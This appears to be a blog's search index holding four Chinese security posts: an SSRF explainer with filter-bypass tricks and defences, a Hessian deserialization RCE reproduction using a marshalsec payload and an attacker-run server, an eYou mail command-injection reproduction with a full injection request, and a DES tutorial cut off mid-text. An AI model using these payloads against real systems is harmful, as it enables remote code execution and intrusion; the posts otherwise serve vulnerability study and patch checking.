<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SSRF漏洞利用及防护</title>
    <url>/2021/04/16/test/</url>
    <content><![CDATA[<h3 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h3><ul>
<li>SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</li>
</ul>
<hr>
<h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><ul>
<li>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</li>
</ul>
<ul>
<li>主要攻击方式如下:   </li>
</ul>
<ol>
<li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li>
<li>攻击运行在内网或本地的应用程序。</li>
<li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li>
<li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li>
<li>利用file协议读取本地文件等。</li>
</ol>
<hr>
<h3 id="三、漏洞常见功能点"><a href="#三、漏洞常见功能点" class="headerlink" title="三、漏洞常见功能点"></a>三、漏洞常见功能点</h3><ul>
<li>加载远程图片功能。</li>
<li>加载远程网页功能。</li>
<li>未公开的api实现及调用URL的功能。</li>
<li>网站提供的各种下载功能点。</li>
<li>在线网页转码服务。</li>
</ul>
<hr>
<h3 id="四、常见的绕过方式"><a href="#四、常见的绕过方式" class="headerlink" title="四、常见的绕过方式"></a>四、常见的绕过方式</h3><ol>
<li><p> @ 符号<br><code>例如：http://abc.com@127.0.0.1</code></p>
</li>
<li><p> 添加端口号<br><code>例如：http://127.0.0.1:8080</code></p>
</li>
<li><p>短地址<br><code>例如：https://0x9.me/xxx</code></p>
</li>
<li><p>利用302跳转<br><code> 例如：将http://zidingyu.com/index.php 设置跳转到127.0.0.1</code></p>
</li>
<li><p>将内部IP进行进制转换<br><code>例如：192.168.0.1=3232235521（十进制）</code></p>
</li>
<li><p>利用非HTTP协议<br><code>例如: file:///, gopher://, ftp:// </code></p>
</li>
<li><p>DNS Rebinding - <a href="https://xz.aliyun.com/t/8707">先知社区</a></p>
</li>
</ol>
<ul>
<li><p>例如一个漏洞点采用了以下的方式进行了防御</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">1. 获取到输入的URL，从该URL中提取host.</span><br><span class="line"></span><br><span class="line">2. 对该host进行DNS解析，获取到解析的IP.</span><br><span class="line"></span><br><span class="line">3. 检测该IP是否是合法的，比如是否是私有IP等.</span><br><span class="line"></span><br><span class="line">4. 如果IP检测为合法的，则进入curl的阶段发包</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li>
<li><p>从DNS解析的角度来看，这个过程一共有两次解析，第一次是对该host进行DNS解析，第二次是进入curl的阶段发包，这两次请求之间存在一个时间差，如果我们能够修改DNS地址在第一次请求的时候为合法地址，第二次请求时为恶意地址，就可以绕过这个检测了。</p>
</li>
<li><p>利用过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 攻击者配置了一台DNS服务器用于解析某域名.</span><br><span class="line"></span><br><span class="line">2. 每次请求后返回的解析结果不一样，分别是一个合法地址，一个是恶意地址.</span><br><span class="line"></span><br><span class="line">3. 当服务器在第一次请求的时候返回合法地址，第二次请求时返回的是恶意地址。就可以绕过限制进行利用.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h3><ol>
<li><p>对于有回显的请求，过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
</li>
<li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。  </p>
</li>
<li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
</li>
<li><p>将内网敏感IP做黑名单限制。避免应用被用来获取获取内网数据，攻击内网。</p>
</li>
<li><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>
</li>
</ol>
<hr>
]]></content>
  </entry>
  <entry>
    <title>Hessian反序列化RCE漏洞</title>
    <url>/2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="一、组件介绍"><a href="#一、组件介绍" class="headerlink" title="一、组件介绍"></a>一、组件介绍</h3><ul>
<li>Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。Hessian反序列化可导致RCE,POC于2017年就公开了,但是经过测试,目前最新版本hessian-4.0.60.jar,同样存在反序列化问题</li>
</ul>
<h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><ol>
<li><p>需要一个提供反序列数据的服务器。</p>
<p> <img src="/images/pasted-3.png" alt="upload successful"></p>
</li>
<li><p>攻击端本地生成payload.里面的地址为提供反序列化数据的服务器地址。</p>
</li>
</ol>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http:&#x2F;&#x2F;471.196.183.126:8180&#x2F; ExecTemplateJDK7&gt;hession</span><br></pre></td></tr></table></figure>
<pre><code>![upload successful](/images/pasted-4.png)
</code></pre>
<p>   攻击端本地生成hession文件。</p>
<ol start="3">
<li>攻击端本地向目标发送payload，使得目标服务器向提供反序列化数据的服务器进行请求。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python hessian.py -u http:&#x2F;&#x2F;192.168.182.178:8080&#x2F;HessianTest&#x2F;hessian -p hession</span><br></pre></td></tr></table></figure>

 <img src="/images/pasted-5.png" alt="upload successful"></li>
<li>目标服务器收到payload，并序列化payload，然后向提供反序列化数据的服务器进行请求。<br> 收到请求 <img src="/images/pasted-6.png" alt="upload successful"></li>
<li>目标服务器成功执行命令。 <img src="/images/pasted-7.png" alt="upload successful"></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>亿邮邮件系统命令执行</title>
    <url>/2021/04/16/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h3 id="一、影响范围"><a href="#一、影响范围" class="headerlink" title="一、影响范围"></a>一、影响范围</h3><ul>
<li><p>V8.3-V8.13 </p>
<span id="more"></span>
<h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><ul>
<li><p>界面信息</p>
<p><img src="/images/pasted-0.png"></p>
</li>
</ul>
</li>
</ul>
<h3 id="三、漏洞证明"><a href="#三、漏洞证明" class="headerlink" title="三、漏洞证明"></a>三、漏洞证明</h3><ol>
<li><p>访问poc的url：10.10.10.130:9091/webadm/q=moni_detail.do&amp;action=gragh<br> <img src="/images/pasted-1.png"></p>
</li>
<li><p>这个返回数据包可用来批量探测是否有价值使用exp来打，如有自写扫描器可加入该poc进行无损扫描。</p>
</li>
<li><p>抓包然后发送payload</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /webadm/?q=moni_detail.do&amp;action=gragh HTTP/1.1</span><br><span class="line">Host: 10.10.10.130:9091</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: <span class="string">&quot; Not;A Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;91&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;91&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: ****</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span>=<span class="string">&#x27;|id||&#x27;</span></span><br></pre></td></tr></table></figure>

<p> <img src="/images/pasted-2.png"></p>
</li>
</ol>
<h3 id="四、修复建议"><a href="#四、修复建议" class="headerlink" title="四、修复建议"></a>四、修复建议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls&#x2F;usr&#x2F;local&#x2F;eyou&#x2F;mail&#x2F;lib&#x2F;php&#x2F;monitor (8.10.x及以后版本)</span><br><span class="line">ls&#x2F;usr&#x2F;local&#x2F;eyou&#x2F;mail&#x2F;app&#x2F;lib&#x2F;php&#x2F;monitor (8.10.x及以前版本)</span><br><span class="line"></span><br><span class="line">*如不了解具体版本号，上述两条命令可不分版本都执行一下</span><br><span class="line">如所有的验证命令都返回&quot;No such file or directory&quot;或&quot;没有那个文件或目录&quot;则证明不存在漏洞，反之则漏洞存在。</span><br></pre></td></tr></table></figure>

<p><br/><br/></p>
<ul>
<li>文章参考 <a href="https://mp.weixin.qq.com/s/0YUpI9O7GqATGXqcOMRCBw">【漏洞复现】亿邮命令执行</a></li>
</ul>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>DES加密原理及实现</title>
    <url>/2021/05/18/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="一、什么是DES加密？"><a href="#一、什么是DES加密？" class="headerlink" title="一、什么是DES加密？"></a>一、什么是DES加密？</h3><ul>
<li>DES 算法是一种常见的分组加密算法，由IBM公司在1971年提出。DES 算法是分组加密算法的典型代表，同时也是应用最为广泛的对称加密算法。</li>
</ul>
<h3 id="二、基础名词解释"><a href="#二、基础名词解释" class="headerlink" title="二、基础名词解释"></a>二、基础名词解释</h3><ul>
<li><p>明文：<br>明文是指没有经过加密的数据。一般而言，明文都是等待传输的数据。由于没有经过加密，明文很容易被识别与破解，因此在传输明文之前必须进行加密处理。</p>
</li>
<li><p>密文：<br>密文只是明文经过某种加密算法而得到的数据，通常密文的形式复杂难以识别及理解。</p>
</li>
<li><p>密钥：<br>密钥是一种参数，它是在明文转换为密文或将密文转换为明文的算法中输入的参数。</p>
</li>
<li><p>对称加密：<br>通信双方同时掌握一个密钥，加密解密都是由一个密钥完成的（即加密密钥等于解密密钥，加解密密钥可以相互推倒出来）。双方通信前共同拟定一个密钥，不对第三方公开。</p>
</li>
<li><p>分组密码：<br>分组密码是将明文分成固定长度的组，每一组都采用同一密钥和算法进行加密，输出也是固定长度的密文。</p>
</li>
</ul>
<h3 id="三、DES加密算法详解"><a href="#三、DES加密算法详解" class="headerlink" title="三、DES加密算法详解"></a>三、DES加密算法详解</h3><ol>
<li><h4 id="DES-加密算法"><a href="#DES-加密算法" class="headerlink" title="DES 加密算法"></a>DES 加密算法</h4></li>
</ol>
<ul>
<li><p>分组长度<br>DES 加密算法中，明文和密文为 64 位分组。密钥的长度为 64 位，但是密钥的每个第八位设置为奇偶校验位，因此密钥的实际长度为56位。</p>
</li>
<li><p>加密流程<br>DES 加密算法大致分为 4 个步骤：<br>（1）初始置换<br>（2）生成子密钥<br>（3）迭代过程<br>（4）逆置换</p>
</li>
<li><p>整个过程流程图：</p>
</li>
</ul>
<p><img src="/images/pasted-8.png" alt="加密流程"></p>
<ol start="2">
<li><h4 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h4></li>
</ol>
<ul>
<li>初始置换是将原始明文经过IP置换表处理。置换过程如图：</li>
</ul>
<p><img src="/images/pasted-9.png" alt="upload successful"></p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">输入64位明文数据M（64位）：</span><br><span class="line">明文M（64位）&#x3D;</span><br><span class="line">0110001101101111011011010111000001110101011101000110010101110010</span><br><span class="line"></span><br><span class="line">选取密钥K（64位）：</span><br><span class="line">密钥K（64位）&#x3D;</span><br><span class="line">0001001100110100010101110111100110011011101111001101111111110001</span><br></pre></td></tr></table></figure>
<ul>
<li><p>IP置换表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">58,50,42,34,26,18,10,02,</span><br><span class="line">60,52,44,36,28,20,12,04,</span><br><span class="line">62,54,46,38,30,22,14,06,</span><br><span class="line">64,56,48,40,32,24,16,08,</span><br><span class="line">57,49,41,33,25,17,09,01,</span><br><span class="line">59,51,43,35,27,19,11,03,</span><br><span class="line">61,53,45,37,29,21,13,05,</span><br><span class="line">63,55,47,39,31,23,15,07,</span><br></pre></td></tr></table></figure>
<p>IP置换表中的数据指的是位置，例如58指将M第58位放置第1位。</p>
</li>
<li><p>M经过IP置换后为M’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">M’（64位） &#x3D;</span><br><span class="line">1111111110111000011101100101011100000000111111110000011010000011</span><br><span class="line"></span><br><span class="line">取M’的前32位作为L0，则有</span><br><span class="line">L0（32位）&#x3D; 11111111101110000111011001010111</span><br><span class="line"></span><br><span class="line">取M’的后32位作为R0，则有</span><br><span class="line">R0（32位）&#x3D; 00000000111111110000011010000011</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><h4 id="生成子密钥"><a href="#生成子密钥" class="headerlink" title="生成子密钥"></a>生成子密钥</h4></li>
</ol>
<ul>
<li>DES 加密共执行16次迭代，每次迭代过程的数据长度为48位，因此需要16个48位的子密钥来进行加密，生成子密钥的过程如下：</li>
</ul>
<p><img src="/images/pasted-10.png" alt="upload successful"></p>
<ul>
<li>密钥的计算过程：<br>  （1）第一轮置换：将64位的初始密钥置换成56位<hr>
<pre><code>密钥 K = 0001001100110100010101110111100110011011101111001101111111110001
需经过PC-1表置换，即执行置换选择1过程。
</code></pre>
PC-1表为： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">57,49,41,33,25,17,09</span><br><span class="line">01,58,50,42,34,26,18</span><br><span class="line">10,02,59,51,43,35,27</span><br><span class="line">19,11,03,60,52,44,36</span><br><span class="line">63,55,47,39,31,23,15</span><br><span class="line">07,62,54,46,38,30,22</span><br><span class="line">14,06,61,53,45,37,29</span><br><span class="line">21,13,05,28,20,12,04</span><br></pre></td></tr></table></figure>
PC-1表为8行7列的表，密钥K经PC-1后变为56位数据K’。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">K’（56位）&#x3D; 11110000110011001010101011110101010101100110011110001111</span><br><span class="line"></span><br><span class="line">取K’的前28位作为C0，则有</span><br><span class="line">C0（28位）&#x3D; 1111000011001100101010101111</span><br><span class="line"></span><br><span class="line">取K’的后28位作为D0，则有</span><br><span class="line">D0（28位）&#x3D; 0101010101100110011110001111</span><br></pre></td></tr></table></figure>
获得C0，D0后进行左移操作需要查询移动位数表：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">轮数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16</span><br><span class="line">位数 1 1 2 2 2 2 2 2 1  2  2  2  2  2  2  1</span><br></pre></td></tr></table></figure>
进行第一轮移位，轮数为1，查表得左移位数为1。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C0左移1位为C1：</span><br><span class="line">C1（28位） &#x3D; 1110000110011001010101011111</span><br><span class="line"></span><br><span class="line">D0左移1位为D1：</span><br><span class="line">D1（28位） &#x3D; 1010101011001100111100011110</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<pre><code>（2）第二轮置换，为生成子密钥的循环步骤。将56位变为48位
</code></pre>
<hr>
<pre><code>将C1和D1合并后，经过PC-2表置换得到子密钥K1，PC-2表中去除了第9，18，22，25，35，38，43，54位。    

PPC-2表为6X8的表，PC-2表如下：
</code></pre>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">14,17,11,24,01,05,</span><br><span class="line">03,28,15,06,21,10,</span><br><span class="line">23,19,12,04,26,08,</span><br><span class="line">16,07,27,20,13,02,</span><br><span class="line">41,52,31,37,47,55,</span><br><span class="line">30,40,51,45,33,48,</span><br><span class="line">44,49,39,56,34,53,</span><br><span class="line">46,42,50,36,29,32</span><br></pre></td></tr></table></figure>
<p>  由于PC-2表为6X8的表，经PC-2置换后的数据为48位，置换后得到密钥K1，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">K1（48位）&#x3D; 000110110000001011101111111111000111000001110010</span><br></pre></td></tr></table></figure>
<ul>
<li>此时成功生成了第一组密钥！！！</li>
</ul>
<p>  C1和D1再次左移，轮数 = 2，查表得左移位数 = 1，则C1和D1左移1位得到C2和D2。<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C2（28位）&#x3D; 1100001100110010101010111111</span><br><span class="line">D2（28位）&#x3D; 0101010110011001111000111101</span><br></pre></td></tr></table></figure><br>C2和D2合并后为56位，经过PC-2表置换得到密钥K2（48位）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">K2（48位）&#x3D; 011110011010111011011001110110111100100111100101</span><br></pre></td></tr></table></figure>
<ul>
<li>此时生成了第二组密钥！！！<br>依次类推，得到K3-K16子密钥，注意Ci和Di左移的位数。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C3（28位） &#x3D; 0000110011001010101011111111</span><br><span class="line">D3（28位） &#x3D; 0101011001100111100011110101</span><br><span class="line">K3（48位） &#x3D; 010101011111110010001010010000101100111110011001</span><br><span class="line"></span><br><span class="line">C4（28位） &#x3D; 0011001100101010101111111100</span><br><span class="line">D4（28位） &#x3D; 0101100110011110001111010101</span><br><span class="line">K4（48位） &#x3D; 011100101010110111010110110110110011010100011101</span><br><span class="line"></span><br><span class="line">C5（28位） &#x3D; 1100110010101010111111110000</span><br><span class="line">D5（28位） &#x3D; 0110011001111000111101010101</span><br><span class="line">K5（48位） &#x3D; 011111001110110000000111111010110101001110101000</span><br><span class="line"></span><br><span class="line">C6（28位） &#x3D; 0011001010101011111111000011</span><br><span class="line">D6（28位） &#x3D; 1001100111100011110101010101</span><br><span class="line">K6（48位） &#x3D; 011000111010010100111110010100000111101100101111</span><br><span class="line"></span><br><span class="line">C7（28位） &#x3D; 1100101010101111111100001100</span><br><span class="line">D7（28位） &#x3D; 0110011110001111010101010110</span><br><span class="line">K7（48位） &#x3D; 111011001000010010110111111101100001100010111100</span><br><span class="line"></span><br><span class="line">C8（28位） &#x3D; 0010101010111111110000110011</span><br><span class="line">D8（28位） &#x3D; 1001111000111101010101011001</span><br><span class="line">K8（48位） &#x3D; 111101111000101000111010110000010011101111111011</span><br><span class="line"></span><br><span class="line">C9（28位） &#x3D; 0101010101111111100001100110</span><br><span class="line">D9（28位） &#x3D; 0011110001111010101010110011</span><br><span class="line">K9（48位） &#x3D; 111000001101101111101011111011011110011110000001</span><br><span class="line"></span><br><span class="line">C10（28位） &#x3D; 0101010111111110000110011001</span><br><span class="line">D10（28位） &#x3D; 1111000111101010101011001100</span><br><span class="line">K10（48位） &#x3D; 101100011111001101000111101110100100011001001111</span><br><span class="line"></span><br><span class="line">C11（28位） &#x3D; 0101011111111000011001100101</span><br><span class="line">D11（28位） &#x3D; 1100011110101010101100110011</span><br><span class="line">K11（48位） &#x3D; 001000010101111111010011110111101101001110000110</span><br><span class="line"></span><br><span class="line">C12（28位） &#x3D; 0101111111100001100110010101</span><br><span class="line">D12（28位） &#x3D; 0001111010101010110011001111</span><br><span class="line">K12（48位） &#x3D; 011101010111000111110101100101000110011111101001</span><br><span class="line"></span><br><span class="line">C13（28位） &#x3D; 0111111110000110011001010101</span><br><span class="line">D13（28位） &#x3D; 0111101010101011001100111100</span><br><span class="line">K13（48位） &#x3D; 100101111100010111010001111110101011101001000001</span><br><span class="line"></span><br><span class="line">C14（28位） &#x3D; 1111111000011001100101010101</span><br><span class="line">D14（28位） &#x3D; 1110101010101100110011110001</span><br><span class="line">K14（48位） &#x3D; 010111110100001110110111111100101110011100111010</span><br><span class="line"></span><br><span class="line">C15（28位） &#x3D; 1111100001100110010101010111</span><br><span class="line">D15（28位） &#x3D; 1010101010110011001111000111</span><br><span class="line">K15（48位） &#x3D; 101111111001000110001101001111010011111100001010</span><br><span class="line"></span><br><span class="line">C16（28位） &#x3D; 1111000011001100101010101111</span><br><span class="line">D16（28位） &#x3D; 0101010101100110011110001111</span><br><span class="line">K16（48位） &#x3D; 110010110011110110001011000011100001011111110101</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4>设Li（32位）和Ri（32位）为第i次迭代结果的左半部分与右半部分，子密钥Ki为第i轮的48位加密密钥。定义运算规则：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Li &#x3D; Ri-1;</span><br><span class="line">Ri &#x3D; Li ⊕ f(Ri-1, Ki);</span><br></pre></td></tr></table></figure>
 整个迭代过程如下图：</li>
</ol>
<p><img src="/images/pasted-11.png" alt="upload successful"></p>
<ul>
<li>文明扩展置换<br>右半部分Ri的位数为32位，而密钥长度Ki为48位，为了能够保证Ri与Ki可以进行异或运算需要对Ri位数进行扩展，用于扩展置换表E如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32,01,02,03,04,05,</span><br><span class="line">04,05,06,07,08,09,</span><br><span class="line">08,09,10,11,12,13,</span><br><span class="line">12,13,14,15,16,17,</span><br><span class="line">16,17,18,19,20,21,</span><br><span class="line">20,21,22,23,24,25,</span><br><span class="line">24,25,26,27,28,29,</span><br><span class="line">28,29,30,31,32,01</span><br></pre></td></tr></table></figure>
例如：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0（32位） &#x3D; 11111111101110000111011001010111</span><br><span class="line">R0（32位） &#x3D; 00000000111111110000011010000011</span><br></pre></td></tr></table></figure>
R0（32位）经过扩展置换后变为48位数据：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E(R0)（48位） &#x3D; 100000000001011111111110100000001101010000000110</span><br></pre></td></tr></table></figure>
将E(R0)（48位）与K1（48位）作异或运算<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  100000000001011111111110100000001101010000000110</span><br><span class="line">  000110110000001011101111111111000111000001110010</span><br><span class="line">&#x3D; 100110110001010100010001011111001010010001110100</span><br></pre></td></tr></table></figure>
得到：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E(R0)^K1（48位） &#x3D; 100110110001010100010001011111001010010001110100</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>S-盒替代<br>代替运算由8个不同的代替盒（S盒）完成。每个S盒有6位输入，4位输出。代替运算流程如下：</li>
</ul>
<p><img src="/images/pasted-12.png" alt="upload successful"><br>  S-盒1：<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">14,04,13,01,02,15,11,08,03,10,06,12,05,09,00,07,</span><br><span class="line">00,15,07,04,14,02,13,01,10,06,12,11,09,05,03,08,</span><br><span class="line">04,01,14,08,13,06,02,11,15,12,09,07,03,10,05,00,</span><br><span class="line">15,12,08,02,04,09,01,07,05,11,03,14,10,00,06,13,</span><br></pre></td></tr></table></figure><br>S-盒2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">15,01,08,14,06,11,03,04,09,07,02,13,12,00,05,10,</span><br><span class="line">03,13,04,07,15,02,08,14,12,00,01,10,06,09,11,05,</span><br><span class="line">00,14,07,11,10,04,13,01,05,08,12,06,09,03,02,15,</span><br><span class="line">13,08,10,01,03,15,04,02,11,06,07,12,00,05,14,09,</span><br></pre></td></tr></table></figure>

<p>S-盒3：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10,00,09,14,06,03,15,05,01,13,12,07,11,04,02,08,</span><br><span class="line">13,07,00,09,03,04,06,10,02,08,05,14,12,11,15,01,</span><br><span class="line">13,06,04,09,08,15,03,00,11,01,02,12,05,10,14,07,</span><br><span class="line">01,10,13,00,06,09,08,07,04,15,14,03,11,05,02,12,</span><br></pre></td></tr></table></figure>

<p>S-盒4：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">07,13,14,03,00,06,09,10,01,02,08,05,11,12,04,15,</span><br><span class="line">13,08,11,05,06,15,00,03,04,07,02,12,01,10,14,09,</span><br><span class="line">10,06,09,00,12,11,07,13,15,01,03,14,05,02,08,04,</span><br><span class="line">03,15,00,06,10,01,13,08,09,04,05,11,12,07,02,14,</span><br></pre></td></tr></table></figure>

<p>S-盒5：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">02,12,04,01,07,10,11,06,08,05,03,15,13,00,14,09,</span><br><span class="line">14,11,02,12,04,07,13,01,05,00,15,10,03,09,08,06,</span><br><span class="line">04,02,01,11,10,13,07,08,15,09,12,05,06,03,00,14,</span><br><span class="line">11,08,12,07,01,14,02,13,06,15,00,09,10,04,05,03,</span><br></pre></td></tr></table></figure>

<p>S-盒6：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12,01,10,15,09,02,06,08,00,13,03,04,14,07,05,11,</span><br><span class="line">10,15,04,02,07,12,09,05,06,01,13,14,00,11,03,08,</span><br><span class="line">09,14,15,05,02,08,12,03,07,00,04,10,01,13,11,06,</span><br><span class="line">04,03,02,12,09,05,15,10,11,14,01,07,06,00,08,13,</span><br></pre></td></tr></table></figure>

<p>S-盒7：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">04,11,02,14,15,00,08,13,03,12,09,07,05,10,06,01,</span><br><span class="line">13,00,11,07,04,09,01,10,14,03,05,12,02,15,08,06,</span><br><span class="line">01,04,11,13,12,03,07,14,10,15,06,08,00,05,09,02,</span><br><span class="line">06,11,13,08,01,04,10,07,09,05,00,15,14,02,03,12,</span><br></pre></td></tr></table></figure>

<p>S-盒8：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">13,02,08,04,06,15,11,01,10,09,03,14,05,00,12,07,</span><br><span class="line">01,15,13,08,10,03,07,04,12,05,06,11,00,14,09,02,</span><br><span class="line">07,11,04,01,09,12,14,02,00,06,10,13,15,03,05,08,</span><br><span class="line">02,01,14,07,04,10,08,13,15,12,09,00,03,05,06,11,</span><br></pre></td></tr></table></figure>
<p><font color=#FF0000>S盒的计算规则：</font></p>
<p>例如：若S-盒1的输入为110111，第一位与最后一位构成11，十进制值为3，则对应第3行，中间4位为1011对应的十进制值为11，则对应第11列。查找S-盒1表的值为14，则S-盒1的输出为1110。8个S盒将输入的48位数据输出为32位数据。</p>
<p>按照S-盒的计算过程，将</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E(R0)^K1（48位）&#x3D; 100110110001010100010001011111001010010001110100，</span><br></pre></td></tr></table></figure>
<p>通过 S- 盒替换得到的S盒输出为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10001011110001000110001011101010（32位）。</span><br></pre></td></tr></table></figure>

<ul>
<li>P-盒置换<br>将S-盒替代的输出结果作为P-盒置换的输入。P-盒置换表如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">16,07,20,21,29,12,28,17,01,15,23,26,05,18,31,10,</span><br><span class="line">02,08,24,14,32,27,03,09,19,13,30,06,22,11,04,25,</span><br></pre></td></tr></table></figure>
将S盒输出10001011110001000110001011101010（32位）经过P盒置换，P-盒置换输出01001000101111110101010110000001</li>
</ul>
<p>令扩展置换E、S-盒替代、P盒置换的过程作为函数f。</p>
<p>第一次迭代过程f(R0,K1)为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f(R0,K1) &#x3D; 01001000101111110101010110000001</span><br></pre></td></tr></table></figure>
<p>计算L1（32位）= R0 = 00000000111111110000011010000011<br>计算R1（32位）= L0 ^ f(R0,K1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  11111111101110000111011001010111</span><br><span class="line">  01001000101111110101010110000001</span><br><span class="line">&#x3D; 10110111000001110010001111010110</span><br></pre></td></tr></table></figure>
<p>R1（32位） = 10110111000001110010001111010110。</p>
<p>将L1与R1作为输入，继续执行迭代过程f。直至输出L16与R16。</p>
<p>经过16次迭代后输出:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L16（32位）&#x3D; 00110000100001001101101100101000</span><br><span class="line">R16（32位）&#x3D; 10110001011001010011000000011000</span><br></pre></td></tr></table></figure>

<ul>
